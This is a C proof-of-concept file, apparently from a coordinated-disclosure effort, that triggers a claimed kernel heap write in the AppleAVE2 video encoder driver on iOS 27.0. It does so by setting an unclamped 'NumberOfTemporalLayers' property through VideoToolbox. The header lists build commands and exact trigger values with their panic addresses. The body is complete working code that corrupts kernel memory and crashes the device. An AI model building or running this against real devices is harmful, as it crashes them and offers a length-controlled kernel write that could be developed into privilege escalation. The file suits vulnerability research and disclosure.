/* ds_kernel_write_min.c — MINIMAL crash-oracle PoC for the AppleAVE2 kernel-write
 * primitive (iOS 27.0 RC 24A435, iPhone17,5). Authorized research on the owner's
 * device, coordinated disclosure. This file ONLY triggers the bug's write and
 * the deterministic teardown deref — no weaponization, no payload logic.
 *
 * WHAT IT DOES (all proven, see write.md):
 *   1. Creates a HW HEVC encode session (the videocodecd -> AppleAVE2 913.43 path).
 *   2. Sets the public property "NumberOfTemporalLayers" = N. On 27.0 the plugin
 *      stores it RAW (no clamp): VPS+8 = N-1 = the fill-loop count.
 *   3. Prepare -> the kext's AVE_PSGen::Init writes pClient[0x4678 + 4*i] = 1
 *      for i < N-1 (THREE loops, same count) — a fully-length-controlled
 *      linear kernel-heap write.
 *   4. Teardown (Invalidate) = the deterministic trigger: AVE_Client_Destroy ->
 *      UninitSurfacePool -> InitList(forged+0x58) -> kernel panic.
 *
 * VALUE BANDS (device-receipted):
 *   N = 16463  clean (one slot before the pool array)
 *   N = 16464  ONE-slot write into pool[0]'s low half -> panic, FAR = 0x59
 *   N = 16465  pool[0] full u64 forge                -> panic, FAR = 0x100000059
 *   N = 16592  the deep pool-forge band (9+ identical panics across 8 boots)
 *   N = 0x10000 ~256KB stomp (the v190 signature)
 *
 * A/B: on iOS 27.2 the SAME property set returns -2004 (the new
 * "NumberOfTemporalLayers <= 7" setter bound) and nothing happens = the
 * differential receipt.
 *
 * Build (iOS, CLI-ish app or the harness target):
 *   clang -x c -arch arm64 -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
 *     -framework VideoToolbox -framework CoreFoundation -framework CoreVideo \
 *     -framework CoreMedia ds_kernel_write_min.c -o ds_kernel_write_min
 */

#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>
#include <stdlib.h>
#include <string.h>

/* the encoder output callback — counts nothing, formats nothing (the oracle
 * is the KERNEL, not the app) */
static void out_cb(void *a, void *b, OSStatus st, VTEncodedSampleInfoFlags f,
                   CMSampleBufferRef s)
{
    (void)a; (void)b; (void)st; (void)f; (void)s;
}

int main(void)
{
    /* 1. the session (128x128 HEVC = the AVE2 hardware path) */
    VTCompressionSessionRef s = NULL;
    OSStatus st = VTCompressionSessionCreate(NULL, 128, 128, kCMVideoCodecType_HEVC,
                                             NULL, NULL, NULL, out_cb, NULL, &s);
    if (st != noErr || !s)
        return 1;

    /* 2. the fire property — UNBOUNDED on 27.0 (receipt: accepted at 22..1792) */
    int64_t n = 16592;   /* the deep pool-forge band; see header for the band table */
    CFNumberRef v = CFNumberCreate(NULL, kCFNumberSInt64Type, &n);
    CFStringRef k = CFStringCreateWithCString(NULL, "NumberOfTemporalLayers",
                                              kCFStringEncodingUTF8);
    VTSessionSetProperty(s, k, v);
    CFRelease(v);
    CFRelease(k);

    /* 3. Prepare -> the kext Init runs the fill loops (the WRITE happens here) */
    VTCompressionSessionPrepareToEncodeFrames(s);

    /* one frame — part of the proven recipe (the session takes the encode path,
     * fails it, and reaches the teardown in the known state) */
    size_t bpr = 128 * 4, len = bpr * 128;
    uint8_t *mem = malloc(len);
    if (mem) {
        memset(mem, 0x42, len);
        CVPixelBufferRef pb = NULL;
        if (CVPixelBufferCreateWithBytes(NULL, 128, 128, kCVPixelFormatType_32BGRA,
                                         mem, bpr, NULL, NULL, NULL, &pb) == kCVReturnSuccess) {
            VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 600),
                                            CMTimeMake(1, 600), NULL, NULL, NULL);
            CFRelease(pb);
        }
        free(mem);
    }
    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);

    /* 4. THE TRIGGER — the deterministic teardown deref (kernel panic on 27.0;
     *    clean return on 27.2: the property was refused at step 2 with -2004) */
    VTCompressionSessionInvalidate(s);
    CFRelease(s);
    return 0;
}
